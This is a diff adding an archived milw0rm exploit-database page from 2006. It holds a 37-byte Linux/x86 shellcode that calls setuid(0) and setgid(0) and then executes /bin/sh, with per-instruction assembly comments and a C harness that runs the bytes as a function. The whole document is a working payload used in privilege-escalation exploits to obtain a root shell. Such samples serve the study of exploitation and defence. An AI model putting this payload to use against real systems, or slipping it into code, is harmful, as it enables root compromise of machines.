@@ -1,0 +1,39 @@
+<html><head><title>linux/x86 setuid(0),setgid(0) execve(/bin/sh, [/bin/sh, NULL]) 37 bytes</title></head><pre>/*
+ * (Linux/x86) setuid(0) + setgid(0) + execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL]) 
+ * - 37 bytes
+ * - xgc@gotfault.net
+ *
+ */
+
+char shellcode[] =
+
+  &quot;\x6a\x17&quot;			// push	$0x17
+  &quot;\x58&quot;			// pop 	%eax
+  &quot;\x31\xdb&quot;			// xor	%ebx, %ebx
+  &quot;\xcd\x80&quot;			// int	$0x80
+
+  &quot;\x6a\x2e&quot;			// push	$0x2e	
+  &quot;\x58&quot;			// pop	%eax
+  &quot;\x53&quot;			// push %ebx
+  &quot;\xcd\x80&quot;			// int	$0x80
+
+  &quot;\x31\xd2&quot;			// xor	%edx, %edx
+  &quot;\x6a\x0b&quot;			// push	$0xb
+  &quot;\x58&quot;			// pop	%eax
+  &quot;\x52&quot;			// push	%edx
+  &quot;\x68\x2f\x2f\x73\x68&quot;	// push	$0x68732f2f
+  &quot;\x68\x2f\x62\x69\x6e&quot;	// push	$0x6e69622f
+  &quot;\x89\xe3&quot;			// mov	%esp, %ebx
+  &quot;\x52&quot;			// push	%edx
+  &quot;\x53&quot;			// push	%ebx
+  &quot;\x89\xe1&quot;			// mov	%esp, %ecx
+  &quot;\xcd\x80&quot;;			// int	$0x80
+ 
+int main() {
+ 
+	int (*f)() = (int(*)())shellcode;
+    printf(&quot;Length: %u\n&quot;, strlen(shellcode));
+    f();
+}
+
+// milw0rm.com [2006-04-03]</pre></html>
